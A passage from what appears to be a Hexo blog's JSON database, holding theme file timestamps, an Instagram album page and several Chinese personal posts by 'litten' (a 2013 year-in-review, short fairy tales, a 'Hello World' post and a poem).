ime":1379858378000},{"_id":"themes\\yilia\\layout\\tag.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\layout.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\post.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\archive.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\archive-post.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\category.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\archive.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\after-footer.ejs","mtime":1411664072000},{"_id":"themes\\yilia\\layout\\_partial\\article.ejs","mtime":1411095364000},{"_id":"themes\\yilia\\layout\\_partial\\footer.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\left-col.ejs","mtime":1411058103000},{"_id":"themes\\yilia\\layout\\_partial\\head.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\header.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\post\\duoshuo.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\post\\share.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\mobile-nav.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\post\\category.ejs","mtime":1411008462000},{"_id":"themes\\yilia\\layout\\_partial\\post\\date.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\post\\tag.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\post\\title.ejs","mtime":1411006138000},{"_id":"themes\\yilia\\layout\\_partial\\post\\nav.ejs","mtime":1411006138000}],"Category":[],"Page":[{"layout":"post","slug":"instagram","title":"相册","noDate":"true","content":"<div class=\"instagram\" data-client-id=\"956dd096b6e5496aba6662165b9b8443\">\n\t<a href=\"http://instagram.com/litten225\" target=\"_blank\" class=\"open-ins\">图片来自instagram，正在加载中…</a>\n</div>\n<script src=\"/js/jquery.lazyload.js\"></script>\n<script src=\"/js/instagram.js\"></script>","source":"instagram/index.ejs","raw":"---\nlayout: post\nslug: \"instagram\"\ntitle: \"相册\"\nnoDate: \"true\"\n---\n\n<div class=\"instagram\" data-client-id=\"956dd096b6e5496aba6662165b9b8443\">\n\t<a href=\"http://instagram.com/litten225\" target=\"_blank\" class=\"open-ins\">图片来自instagram，正在加载中…</a>\n</div>\n<script src=\"/js/jquery.lazyload.js\"></script>\n<script src=\"/js/instagram.js\"></script>","date":1409389832000,"updated":1409997887000,"path":"instagram/index.html","excerpt":"","_id":"0ngo63ritdflapff","comments":true}],"Post":[{"layout":"post","title":"我的2013下半年","date":1391540100000,"comments":true,"tags":["jc0qt8cakht35ew1"],"content":"<ol>\n<li>自学了日语，今年考级。小时爱吃红富士苹果，大了向往富士山，但愿今年或明年能说走咱就走</li>\n<li>经历了车祸，灾难面前无能为力，但也没有想象的恐怖</li>\n<li>第一次骑马，自驾车游。想像中的速度与激情也只是有边界的飞行与欢愉。我还想去更远的地方</li>\n<li>看完了《金瓶梅词话》崇祯原版，近年书籍中此本给我的震撼和思考最多</li>\n<li>无悔的加盟了腾讯</li>\n<li>较熟练的掌握了第一门乐器，当然“熟练”的说法是给自己的评语…他们一般说的扰民不好</li>\n<li>毕业第二天就丢了毕业证，学位证，手提电脑以及四年的资料与照片。那段时间诸事不顺，事后我爸分析说我生性随意，穿的袜子一黑一白导致的风水不调</li>\n<li>把村上春树三部曲过了一遍，不再那么抵触他了，但远远还不能感受到你们说的“行文如风”</li>\n<li>之前不太看电视剧，用尝试性的心态看了韩剧，英剧，美剧，日剧，各一。终于跟我很潮的外婆找到了共同话题，赶上了她这辆飞奔的“三零后”列车</li>\n<li>那些尝试过，但没毅力坚持下来的事情：手绘和轮滑（此处真诚检讨但不打算改…）</li>\n<li>年末搭上3D建模的末班车，并疯狂喜欢上。用的Maya，还不算熟练，但相信很快会okay。不要叫我弄PS了，我已从二次元奔向三次元</li>\n<li>第一次单独旅行。虽然一直迷路，虽然没有星星点灯照亮我的前程。但是，爽，够了</li>\n<li>第一次给家里买礼物，带的小米盒子，叫我妈猜有什么用，她说是暖手宝宝。后来整个春节她不亦乐乎的拉着我看了第五遍的爸爸去哪儿</li>\n<li>毕业时设计了学院的毕业衫，这也意味着暂时告别了心爱的设计领域。但总觉得我的设计生涯一片无悔</li>\n<li>拖延症越发严重，英语能力下降，没坚持锻炼身体，胆小认生，按时睡觉也会有超大黑眼圈。感觉这不是小事记一下吧</li>\n<li>用node-webkit完成了自己第一款独立开发并发布的软件。无感。</li>\n<li>成为了真正意义上的web前端工程师，佩服于henry和brad的专业学识，并感谢你们对我的严厉与宽容。</li>\n<li>我终于失去了你/在拥挤的人群中/我终于失去了你/当我的人生第一次感到光荣</li>\n</ol>\n<p>The End.<br>——litten 02.05 深夜。</p>\n","source":"_posts/my2013.markdown","raw":"---\nlayout: post\ntitle: \"我的2013下半年\"\ndate: 2014-02-05 02:55\ncomments: true\ntags: \n\t- 随笔\n---       \n\n1. 自学了日语，今年考级。小时爱吃红富士苹果，大了向往富士山，但愿今年或明年能说走咱就走\n2. 经历了车祸，灾难面前无能为力，但也没有想象的恐怖\n3. 第一次骑马，自驾车游。想像中的速度与激情也只是有边界的飞行与欢愉。我还想去更远的地方\n4. 看完了《金瓶梅词话》崇祯原版，近年书籍中此本给我的震撼和思考最多\n5. 无悔的加盟了腾讯\n6. 较熟练的掌握了第一门乐器，当然“熟练”的说法是给自己的评语…他们一般说的扰民不好\n7. 毕业第二天就丢了毕业证，学位证，手提电脑以及四年的资料与照片。那段时间诸事不顺，事后我爸分析说我生性随意，穿的袜子一黑一白导致的风水不调\n8. 把村上春树三部曲过了一遍，不再那么抵触他了，但远远还不能感受到你们说的“行文如风”\n9. 之前不太看电视剧，用尝试性的心态看了韩剧，英剧，美剧，日剧，各一。终于跟我很潮的外婆找到了共同话题，赶上了她这辆飞奔的“三零后”列车\n10. 那些尝试过，但没毅力坚持下来的事情：手绘和轮滑（此处真诚检讨但不打算改…）\n11. 年末搭上3D建模的末班车，并疯狂喜欢上。用的Maya，还不算熟练，但相信很快会okay。不要叫我弄PS了，我已从二次元奔向三次元\n12. 第一次单独旅行。虽然一直迷路，虽然没有星星点灯照亮我的前程。但是，爽，够了\n13. 第一次给家里买礼物，带的小米盒子，叫我妈猜有什么用，她说是暖手宝宝。后来整个春节她不亦乐乎的拉着我看了第五遍的爸爸去哪儿\n14. 毕业时设计了学院的毕业衫，这也意味着暂时告别了心爱的设计领域。但总觉得我的设计生涯一片无悔\n15. 拖延症越发严重，英语能力下降，没坚持锻炼身体，胆小认生，按时睡觉也会有超大黑眼圈。感觉这不是小事记一下吧\n16. 用node-webkit完成了自己第一款独立开发并发布的软件。无感。\n17. 成为了真正意义上的web前端工程师，佩服于henry和brad的专业学识，并感谢你们对我的严厉与宽容。\n18. 我终于失去了你/在拥挤的人群中/我终于失去了你/当我的人生第一次感到光荣\n\nThe End.\n——litten 02.05 深夜。","slug":"my2013","updated":1412784837000,"excerpt":"","_id":"0iwg9xhvmgvvuczj","categories":[],"photos":[],"link":""},{"layout":"post","title":"【梦中的小偷】【织梦人的表白】","date":1378781700000,"comments":true,"tags":["jc0qt8cakht35ew1"],"brief":"两个爱情故事，谁看？","content":"<p><strong>【梦中的小偷】</strong></p>\n<p>花店的姑娘喜欢他已经很久了，但羞涩的夜雾总是阻隔着她的心事。警察喜欢姑娘也已经很久了，他勇敢正义，在她面前却像小偷一般。每天他们回家时，都会相向经过小巷，这是一条他们都愿意迷失的归途。撑着油纸伞，渐行渐近的，是彼此瑟缩的心跳。姑娘的长发芬芳如兰，飘散如霓，一如晚风扫过梦境，一个不经意的眼神，两人如同触电一般的回避，丘比特躲在墙角呵呵呵的笑…但这个心事，大家都没有说破。<br><a id=\"more\"></a><br>有一天，姑娘来找他，说她遇到了一个小偷，每天都会偷走她的一朵玫瑰。但这个小偷活在她的梦中，每晚睡着时都会出现，问警察能不能帮抓住他。警察神通广大，抓过的小偷不计其数，小到偷糖的有着透明翅膀的蚂蚁，大到喜欢金币的贪婪巨龙，但他着实没有见过梦中的小偷。他还是毫不迟疑的答应了面前低着头的姑娘，缘于内心无与言说的理由。只是，如何才能进入姑娘的梦境是一个巨大的难题。他请教了一切有学识的人，炼金术师，先知，方士，甚至是路过的游吟诗人，最后他被赠与了一瓶毒药——一个神秘的织梦者告诉他，喝掉它就能进入梦境，代价是醒来后会忘掉那个最喜欢的人。</p>\n<p>强烈的爱意使警察奋不顾身，即使只是为她去抓一个小偷，即使醒来就要忘了她。他愿意，让爱情像烟花一样绽放一次。毒药穿肠而过时，他感觉到那是酒的味道，苦涩又甘洌。而姑娘的梦中是一片花的海洋，却没有小偷的身影。他沿着花径一直走，到了尽头，那里是一个清澈的湖，警察往湖水看下去，终于看到了小偷正义的脸庞。姑娘站在远处，澄澈的湖光将她的心事映得通透，她轻轻的告诉他：“你这个该死的小偷，竟偷走了我的心…”</p>\n<p><strong>【织梦人的表白】</strong></p>\n<p>织梦人喜欢在夜里漫游，但没人知道这其中的原因。织梦人知道原因，但他想说出来时，都被人们当作了梦中的呓语。他走路平稳缓慢，仿佛一阵风在缓缓掠过，当午夜的百里香随月光四起，茫茫星图在诉说心事之时，织梦人将脚步放到最慢，独享这静美的时光。他走呀走，等到快要走到夜的尽头，他总会留下一张巨大的梦，像被子一样铺展到人们身上，就此隐去行踪。他是夜的行者，也是梦的主人。</p>\n<p>塘边的一隅花影重重，那是他时常流连的所在，而他喜欢的她，则是这里最美的花仙。短暂的花期使得告白计划略显仓促，而这又是他唯一的机会——七天后随鲜花零落，花仙们将飘散远方，寻找新的花海。织梦人将绵延的情绪写成诗，再编织成了七张有声音的梦。于是在仙子的梦中…</p>\n<p>第一天。他带她听善解人意的雨水，那些叮咚的声响，他说这是春天的表白。<br>第二天。他轻捂她的耳，说这是风的吟唱，正在撩拨开夜的黑发。<br>第三天。他们听到压迫着大地的节奏，那是四处奔跑的小鹿，源源的活力在土地的经脉游走。<br>第四天。他们听见瑟缩的微动，不知是竹子的拔节，还是彼此的心跳？<br>第五天。他让雷声奔流，告诉她需要乐观与勇敢。<br>第六天。他告诉她，月亮在乌云中钻出来时，也会有调皮的笑声。<br>第七天。他让她听到了自己的声音：我爱你…              </p>\n<p>静心设计的表白似乎没有给织梦人带来收获，因为花仙在第二天醒来后，就会忘掉昨日的梦。而不善表达的他，仍然不敢在真实的世界勇敢一次。花仙梦醒时的明媚笑容与织梦人的落寞相映成殇。而就在花仙们离去的黄昏，她却留了下来，她寻到了他，问：趁玫瑰还没凋谢，能替我摘一朵吗？惊喜与不解冲昏了头脑，糊涂的织梦人来不及思考其中的原因——原来慌乱中第七张梦被遗落在家里，第七天的事情是真实的经历。花仙说，无数个梦，不如一个真实的你。从此，织梦人不再织梦。</p>\n<p>——litten 2013.09.10 讲两个爱情故事给谁听？</p>\n","source":"_posts/my-fairy-tale2.markdown","raw":"---\nlayout: post\ntitle: \"【梦中的小偷】【织梦人的表白】\"\ndate: 2013-09-10 10:55\ncomments: true\ntags: \n\t- 随笔\nbrief: \"两个爱情故事，谁看？\"\n---       \n**【梦中的小偷】**\n\n花店的姑娘喜欢他已经很久了，但羞涩的夜雾总是阻隔着她的心事。警察喜欢姑娘也已经很久了，他勇敢正义，在她面前却像小偷一般。每天他们回家时，都会相向经过小巷，这是一条他们都愿意迷失的归途。撑着油纸伞，渐行渐近的，是彼此瑟缩的心跳。姑娘的长发芬芳如兰，飘散如霓，一如晚风扫过梦境，一个不经意的眼神，两人如同触电一般的回避，丘比特躲在墙角呵呵呵的笑…但这个心事，大家都没有说破。\n<!-- more -->\n有一天，姑娘来找他，说她遇到了一个小偷，每天都会偷走她的一朵玫瑰。但这个小偷活在她的梦中，每晚睡着时都会出现，问警察能不能帮抓住他。警察神通广大，抓过的小偷不计其数，小到偷糖的有着透明翅膀的蚂蚁，大到喜欢金币的贪婪巨龙，但他着实没有见过梦中的小偷。他还是毫不迟疑的答应了面前低着头的姑娘，缘于内心无与言说的理由。只是，如何才能进入姑娘的梦境是一个巨大的难题。他请教了一切有学识的人，炼金术师，先知，方士，甚至是路过的游吟诗人，最后他被赠与了一瓶毒药——一个神秘的织梦者告诉他，喝掉它就能进入梦境，代价是醒来后会忘掉那个最喜欢的人。\n\n强烈的爱意使警察奋不顾身，即使只是为她去抓一个小偷，即使醒来就要忘了她。他愿意，让爱情像烟花一样绽放一次。毒药穿肠而过时，他感觉到那是酒的味道，苦涩又甘洌。而姑娘的梦中是一片花的海洋，却没有小偷的身影。他沿着花径一直走，到了尽头，那里是一个清澈的湖，警察往湖水看下去，终于看到了小偷正义的脸庞。姑娘站在远处，澄澈的湖光将她的心事映得通透，她轻轻的告诉他：“你这个该死的小偷，竟偷走了我的心…”\n\n**【织梦人的表白】**\n\n织梦人喜欢在夜里漫游，但没人知道这其中的原因。织梦人知道原因，但他想说出来时，都被人们当作了梦中的呓语。他走路平稳缓慢，仿佛一阵风在缓缓掠过，当午夜的百里香随月光四起，茫茫星图在诉说心事之时，织梦人将脚步放到最慢，独享这静美的时光。他走呀走，等到快要走到夜的尽头，他总会留下一张巨大的梦，像被子一样铺展到人们身上，就此隐去行踪。他是夜的行者，也是梦的主人。\n\n塘边的一隅花影重重，那是他时常流连的所在，而他喜欢的她，则是这里最美的花仙。短暂的花期使得告白计划略显仓促，而这又是他唯一的机会——七天后随鲜花零落，花仙们将飘散远方，寻找新的花海。织梦人将绵延的情绪写成诗，再编织成了七张有声音的梦。于是在仙子的梦中…\n\n第一天。他带她听善解人意的雨水，那些叮咚的声响，他说这是春天的表白。              \n第二天。他轻捂她的耳，说这是风的吟唱，正在撩拨开夜的黑发。              \n第三天。他们听到压迫着大地的节奏，那是四处奔跑的小鹿，源源的活力在土地的经脉游走。              \n第四天。他们听见瑟缩的微动，不知是竹子的拔节，还是彼此的心跳？              \n第五天。他让雷声奔流，告诉她需要乐观与勇敢。              \n第六天。他告诉她，月亮在乌云中钻出来时，也会有调皮的笑声。              \n第七天。他让她听到了自己的声音：我爱你…              \n\n静心设计的表白似乎没有给织梦人带来收获，因为花仙在第二天醒来后，就会忘掉昨日的梦。而不善表达的他，仍然不敢在真实的世界勇敢一次。花仙梦醒时的明媚笑容与织梦人的落寞相映成殇。而就在花仙们离去的黄昏，她却留了下来，她寻到了他，问：趁玫瑰还没凋谢，能替我摘一朵吗？惊喜与不解冲昏了头脑，糊涂的织梦人来不及思考其中的原因——原来慌乱中第七张梦被遗落在家里，第七天的事情是真实的经历。花仙说，无数个梦，不如一个真实的你。从此，织梦人不再织梦。\n\n——litten 2013.09.10 讲两个爱情故事给谁听？\n","slug":"my-fairy-tale2","updated":1409365048000,"excerpt":"<p><strong>【梦中的小偷】</strong></p>\n<p>花店的姑娘喜欢他已经很久了，但羞涩的夜雾总是阻隔着她的心事。警察喜欢姑娘也已经很久了，他勇敢正义，在她面前却像小偷一般。每天他们回家时，都会相向经过小巷，这是一条他们都愿意迷失的归途。撑着油纸伞，渐行渐近的，是彼此瑟缩的心跳。姑娘的长发芬芳如兰，飘散如霓，一如晚风扫过梦境，一个不经意的眼神，两人如同触电一般的回避，丘比特躲在墙角呵呵呵的笑…但这个心事，大家都没有说破。<br>","_id":"r7svbey4tia1rzgg","categories":[],"photos":[],"link":""},{"layout":"post","title":"Hello World","date":1355333940000,"comments":true,"tags":["u2apvepnvh8nr37o","93rwbunpa4djpbvp"],"key":"1","content":"<p>在Winiex的推荐和帮助下，这个octopress博客终于搭建起来了。</p>\n<p>折腾了两天多，在github page上看到自己的博客加载下来时，突然有种错综复杂的恍惚感。是的，它不是qq空间，不是新浪博客，不是豆瓣小站，也不是贴吧。它更像是属于自己的一块小小的领地，因而我满足于这种归属感。我愿在上面安静劳作。</p>\n<p>一个农民，通过自身努力终于分到了一块地，不再需要在地主的土地上创造流量价值时，于是翻身作主的他可以宣告说：Hello World。当然这个农民确切来说是个码农。</p>\n<p>感谢Zespia提供的slash主题。我很喜欢这种色调。</p>\n","source":"_posts/hello-world.markdown","raw":"---\nlayout: post\ntitle: \"Hello World\"\ndate: 2012-12-13 01:39\ncomments: true\ntags: \n\t- 杂谈 \n\t- octopress\nkey: \"1\"\n---\n在Winiex的推荐和帮助下，这个octopress博客终于搭建起来了。\n\n折腾了两天多，在github page上看到自己的博客加载下来时，突然有种错综复杂的恍惚感。是的，它不是qq空间，不是新浪博客，不是豆瓣小站，也不是贴吧。它更像是属于自己的一块小小的领地，因而我满足于这种归属感。我愿在上面安静劳作。\n\n一个农民，通过自身努力终于分到了一块地，不再需要在地主的土地上创造流量价值时，于是翻身作主的他可以宣告说：Hello World。当然这个农民确切来说是个码农。\n\n感谢Zespia提供的slash主题。我很喜欢这种色调。","slug":"hello-world","updated":1409147471000,"excerpt":"","_id":"fk39hk7s3pypjbeb","categories":[],"photos":[],"link":""},{"layout":"post","title":"把自己锁在杯子里","date":1389357000000,"comments":true,"tags":["jc0qt8cakht35ew1","tq61934ev7ievvyb"],"content":"<p>最近流行把动漫人物锁在手机屏幕里，我把自己锁在了杯具里。<br><a id=\"more\"></a><br><img src=\"/assets/blogImg/lock.jpg\" alt=\"我很无聊我承认了\">   </p>\n<p>很无聊我就认了，其实最近过得并不算顺利。<br>不满意于自己的状态。litten，你的自信呢？真的被“封印”起来了吗？                </p>\n<blockquote>\n<p>杯子里的一条鱼<br>你可担心会有天外扑来的龙卷风<br>把你的魂魄摄出领地？<br>泳池温热，心脏被灌了风，开垦者默言而卧<br>涛声隐隐作痛<br>若是一壶热酒浇下，由西向东<br>你是缱绻醉倒？还是鱼跃入梦？                                </p>\n</blockquote>\n<p>The End.<br>——litten 01.10 陌生人，能饮一杯无？</p>\n","source":"_posts/lock-me-in-a-cup.markdown","raw":"---\nlayout: post\ntitle: \"把自己锁在杯子里\"\ndate: 2014-01-10 20:30\ncomments: true\ntags: \n\t- 随笔 \n\t- 药别停\n---       \n最近流行把动漫人物锁在手机屏幕里，我把自己锁在了杯具里。  \n<!-- more -->     \n![我很无聊我承认了](/assets/blogImg/lock.jpg)   \n\n很无聊我就认了，其实最近过得并不算顺利。          \n不满意于自己的状态。litten，你的自信呢？真的被“封印”起来了吗？                \n\n> 杯子里的一条鱼               \n> 你可担心会有天外扑来的龙卷风                                \n> 把你的魂魄摄出领地？                               \n> 泳池温热，心脏被灌了风，开垦者默言而卧                                \n> 涛声隐隐作痛                                      \n> 若是一壶热酒浇下，由西向东                                \n> 你是缱绻醉倒？还是鱼跃入梦？                                \n\n\n\nThe End.             \n——litten 01.10 陌生人，能饮一杯无？","slug":"lock-me-in-a-cup","updated":1409364857000,"excerpt":"<p>最近流行把动漫人物锁在手机屏幕里，我把自己锁在了杯具里。<br>","_id":"otag3mi94ren0bsp","categories":[],"photos":[],"link":""},{"layout":"post","title":"【裁缝的工具】【天气精灵】【匠人与万能胶水】","date":1367256960000,"comments":true,"tags":["jc0qt8cakht35ew1"],"brief":"这里有三个2kb的故事…","content":"<p><strong>【裁缝的工具】</strong></p>\n<p>用剪刀来裁剪，用针线来缝补是裁缝最平常的工作。来找他的客人络绎不绝，因为他拥有神乎其技的手艺。裁缝的技术，绝不仅仅体现在布料上。每天早上，在露珠尚未蒸发的时候，他都会用剪刀把最温润的阳光剪下三米，细心的捆扎好，到了晚上，他再拿出针线把阳光缝到屋顶上以供照明。裁缝说这阳光里还能听到百灵鸟的叫声。午后小憩，他习惯将两块小巧精致的布料塞在耳朵上，那是他去年旅游时裁剪下来的音乐。<br><a id=\"more\"></a><br>裁缝从未推三阻四过，直到他遇到了姑娘。男孩移情它芳，毅然的抛弃使姑娘痛心非常。姑娘哭着求裁缝，说道：我失恋了，请你帮帮我。裁缝知道，姑娘想借走的东西是他的针线，可以将她和心上人的心重新缝补到一起。她是小镇上开花店的姑娘，她和裁缝的女儿年纪一般大，有着露珠一般透彻的眼眸和兰草一般的清香。在看到她泪水的那一刻，裁缝就知道自己无法拒绝她。然而缝补爱情这件事，裁缝思索了再三。裁缝并不是怀疑自己的能力，而是因为一些只可意会的经验——恋人的线是一种特殊的线，是否坚韧取决于恋人双方，断了再续，有时徒添针孔，并不能长久。而男孩人品不端，这对眼前的姑娘可能并非好事。裁缝脸上阴晴不定，却被细心的妻子看出了端倪。妻子说她可以帮忙解决姑娘的困惑。</p>\n<p>几天之后，裁缝又看到了那个花店姑娘，玫瑰般的微笑在她脸上再次得以绽放。裁缝问：“最后你把针线借给了她？”“不，是你的剪刀。”妻子说。</p>\n<p><strong>【天气精灵】</strong></p>\n<p>天上有一群精灵，没人见过他们的相貌，我们姑且认为他们都是些淘气的孩子。他们掌控着天气的阴晴，以特殊的方式——精灵们戴着罩耳式的大耳机，整天摇头晃脑不厌其烦地听着mp3，播放列表里面则是：下雨，大雾，多云，阴天，晴天…播放到哪一个，地上就会是相应的天气。天气精灵们其实都是名副其实的音乐发烧友。</p>\n<p>有些地方的精灵喜欢摇滚，那么他们会喜欢在夏日听大晴天的热烈，据说重庆和南京的精灵还会叼上一只雪糕消暑，雪糕是云做的；有些精灵喜欢雨天的温润，他们一定是来自南方的小镇，兴许还会懂些吴侬软语；有些精灵把播放列表设置为“随机播放”，他们是武汉天气变化多端的罪魁祸首。</p>\n<p>而他们的生活也并不是无忧无虑的。“我的耳机坏了…”精灵小B哭着说：“都是沙沙沙的噪音，这可怎么办？”精灵们焦急的聚集在一起，在云彩上凿开了一个小口。他么争先恐后地眺望下去，小B的城市已被雾霭和沙暴浸成昏红，这一片隐形的痛楚，仿佛是在流着现代的血…</p>\n<p><strong>【匠人与万能胶水】</strong></p>\n<p>南方有一位年轻的匠人，他的梦想是发明一种万能的胶水。即使他的技艺已经日趋纯熟，但极好的天赋强迫他要有更好的追求。小镇的小男孩砸坏了一只鹅蛋，蛋壳、蛋清和蛋黄瞬间洒落满地，哭泣声中匠人已将自己发明的胶水涂上，一分钟后，小男孩看着完好如初的鹅蛋破涕为笑。几天后鹅蛋居然顺利孵出了小鹅，在确认了这个消息后，匠人跪倒在师傅面前，问道：“这是不是这世上最万能的胶水？”</p>\n<p>师傅还是像以往一样摇了摇头：“你的胶水粘得住万物，可粘不住人心…”匠人决定去北方寻找能粘住人心的胶水，狂热甚至失去理智的追求让他彻夜难眠，第二天他就决意出发。匠人对家乡并无太多的依恋，姑娘一直送他到长亭，但匠人吝惜得不说一句话，他的眼里只有前方。草草的告别不像童话故事一般的浪漫，莺飞草长的气息掩盖不住姑娘的神伤。</p>\n<p>每天傍晚时分，干完工作的她总会站在路口张望。穿着碎花浅蓝长裙的她不想多说话，只是聆听着脚步声在时光间隙里匆匆而过。雨天里她会恼怒责怪房顶的信鸽不去工作，秋日里她不敢去碰悲秋伤情的小词篇章。匠人说他有新进展时，她欣喜万分，当知道他途遇险阻时，姑娘又禁不住日添消瘦，这其中的悲欢，不知道姑娘是在书信中知晓，还是在梦中会晤。她不时把弄着匠人送她的折扇——匠人用胶水把花香和鸟语粘到扇子上，任何时候都能扇出和煦的春风。</p>\n<p>时间的窗棂里四季交替，养鹅的小男孩不知已经拥有过多少窝小鹅，匠人终于回来了。匠人两手空空，他的计划最后以失败告终。而他的眼神里没有半点失落，姑娘从里面甚至看得到自己的倒影。她突然记起匠人的师傅说过：“当他空着手回来找你时，他已知道什么是万能的胶水…”</p>\n<p>——litten 4.30</p>\n","source":"_posts/my-fairy-tale1.markdown","raw":"---\nlayout: post\ntitle: \"【裁缝的工具】【天气精灵】【匠人与万能胶水】\"\ndate: 2013-04-30 01:36\ncomments: true\ntags: \n\t- 随笔\nbrief: \"这里有三个2kb的故事…\"\n---       \n**【裁缝的工具】**\n\n用剪刀来裁剪，用针线来缝补是裁缝最平常的工作。来找他的客人络绎不绝，因为他拥有神乎其技的手艺。裁缝的技术，绝不仅仅体现在布料上。每天早上，在露珠尚未蒸发的时候，他都会用剪刀把最温润的阳光剪下三米，细心的捆扎好，到了晚上，他再拿出针线把阳光缝到屋顶上以供照明。裁缝说这阳光里还能听到百灵鸟的叫声。午后小憩，他习惯将两块小巧精致的布料塞在耳朵上，那是他去年旅游时裁剪下来的音乐。\n<!-- more -->\n裁缝从未推三阻四过，直到他遇到了姑娘。男孩移情它芳，毅然的抛弃使姑娘痛心非常。姑娘哭着求裁缝，说道：我失恋了，请你帮帮我。裁缝知道，姑娘想借走的东西是他的针线，可以将她和心上人的心重新缝补到一起。她是小镇上开花店的姑娘，她和裁缝的女儿年纪一般大，有着露珠一般透彻的眼眸和兰草一般的清香。在看到她泪水的那一刻，裁缝就知道自己无法拒绝她。然而缝补爱情这件事，裁缝思索了再三。裁缝并不是怀疑自己的能力，而是因为一些只可意会的经验——恋人的线是一种特殊的线，是否坚韧取决于恋人双方，断了再续，有时徒添针孔，并不能长久。而男孩人品不端，这对眼前的姑娘可能并非好事。裁缝脸上阴晴不定，却被细心的妻子看出了端倪。妻子说她可以帮忙解决姑娘的困惑。\n\n几天之后，裁缝又看到了那个花店姑娘，玫瑰般的微笑在她脸上再次得以绽放。裁缝问：“最后你把针线借给了她？”“不，是你的剪刀。”妻子说。\n\n**【天气精灵】**\n\n天上有一群精灵，没人见过他们的相貌，我们姑且认为他们都是些淘气的孩子。他们掌控着天气的阴晴，以特殊的方式——精灵们戴着罩耳式的大耳机，整天摇头晃脑不厌其烦地听着mp3，播放列表里面则是：下雨，大雾，多云，阴天，晴天…播放到哪一个，地上就会是相应的天气。天气精灵们其实都是名副其实的音乐发烧友。\n\n有些地方的精灵喜欢摇滚，那么他们会喜欢在夏日听大晴天的热烈，据说重庆和南京的精灵还会叼上一只雪糕消暑，雪糕是云做的；有些精灵喜欢雨天的温润，他们一定是来自南方的小镇，兴许还会懂些吴侬软语；有些精灵把播放列表设置为“随机播放”，他们是武汉天气变化多端的罪魁祸首。\n\n而他们的生活也并不是无忧无虑的。“我的耳机坏了…”精灵小B哭着说：“都是沙沙沙的噪音，这可怎么办？”精灵们焦急的聚集在一起，在云彩上凿开了一个小口。他么争先恐后地眺望下去，小B的城市已被雾霭和沙暴浸成昏红，这一片隐形的痛楚，仿佛是在流着现代的血…\n\n**【匠人与万能胶水】**\n\n南方有一位年轻的匠人，他的梦想是发明一种万能的胶水。即使他的技艺已经日趋纯熟，但极好的天赋强迫他要有更好的追求。小镇的小男孩砸坏了一只鹅蛋，蛋壳、蛋清和蛋黄瞬间洒落满地，哭泣声中匠人已将自己发明的胶水涂上，一分钟后，小男孩看着完好如初的鹅蛋破涕为笑。几天后鹅蛋居然顺利孵出了小鹅，在确认了这个消息后，匠人跪倒在师傅面前，问道：“这是不是这世上最万能的胶水？”\n\n师傅还是像以往一样摇了摇头：“你的胶水粘得住万物，可粘不住人心…”匠人决定去北方寻找能粘住人心的胶水，狂热甚至失去理智的追求让他彻夜难眠，第二天他就决意出发。匠人对家乡并无太多的依恋，姑娘一直送他到长亭，但匠人吝惜得不说一句话，他的眼里只有前方。草草的告别不像童话故事一般的浪漫，莺飞草长的气息掩盖不住姑娘的神伤。\n\n每天傍晚时分，干完工作的她总会站在路口张望。穿着碎花浅蓝长裙的她不想多说话，只是聆听着脚步声在时光间隙里匆匆而过。雨天里她会恼怒责怪房顶的信鸽不去工作，秋日里她不敢去碰悲秋伤情的小词篇章。匠人说他有新进展时，她欣喜万分，当知道他途遇险阻时，姑娘又禁不住日添消瘦，这其中的悲欢，不知道姑娘是在书信中知晓，还是在梦中会晤。她不时把弄着匠人送她的折扇——匠人用胶水把花香和鸟语粘到扇子上，任何时候都能扇出和煦的春风。\n\n时间的窗棂里四季交替，养鹅的小男孩不知已经拥有过多少窝小鹅，匠人终于回来了。匠人两手空空，他的计划最后以失败告终。而他的眼神里没有半点失落，姑娘从里面甚至看得到自己的倒影。她突然记起匠人的师傅说过：“当他空着手回来找你时，他已知道什么是万能的胶水…”\n\n——litten 4.30\n\n\n\n\n","slug":"my-fairy-tale1","updated":1409365054000,"excerpt":"<p><strong>【裁缝的工具】</strong></p>\n<p>用剪刀来裁剪，用针线来缝补是裁缝最平常的工作。来找他的客人络绎不绝，因为他拥有神乎其技的手艺。裁缝的技术，绝不仅仅体现在布料上。每天早上，在露珠尚未蒸发的时候，他都会用剪刀把最温润的阳光剪下三米，细心的捆扎好，到了晚上，他再拿出针线把阳光缝到屋顶上以供照明。裁缝说这阳光里还能听到百灵鸟的叫声。午后小憩，他习惯将两块小巧精致的布料塞在耳朵上，那是他去年旅游时裁剪下来的音乐。<br>","_id":"98c6zfn9smu6xcx8","categories":[],"photos":[],"link":""},{"layout":"post","title":"三台戏","date":1408468680000,"comments":true,"tags":["exylnxqv2j55vwu4","jc0qt8cakht35ew1"],"content":"<p>某天，我站在地铁口的一幅海报前。</p>\n<p>巨大的国际象棋棋盘横据画面中心，棋盘微斜，偏移的角度恰好。纹理和刻痕显然是精心设计，至少要用掉三个图层。哑光效果也异常出色。除去文案，这是难得一见的好海报。</p>\n<p>但这么多的细节，都是大脑正常运作时所认知到的。我的第一个想法，或者说是直觉，是看着这黑白的格子，就掏出了手机扫一扫…中毒至斯。</p>\n<p>但我后来又想，这种“入戏太深”的场景和程序员这一职业不无关系…<br><a 